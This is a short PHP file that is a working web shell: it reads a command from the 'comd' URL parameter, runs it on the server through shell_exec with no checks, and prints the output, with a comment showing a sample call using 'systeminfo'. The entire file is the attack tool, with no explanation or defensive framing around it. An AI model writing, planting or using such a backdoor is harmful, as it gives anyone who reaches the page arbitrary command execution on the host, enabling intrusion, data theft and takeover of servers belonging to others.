<?php
    $cmd = $_GET["comd"];
    if(isset($cmd)){
        echo "<pre>" .shell_exec($cmd) . "</pre>";
    }
    die();
//?comd=systeminfo
?>
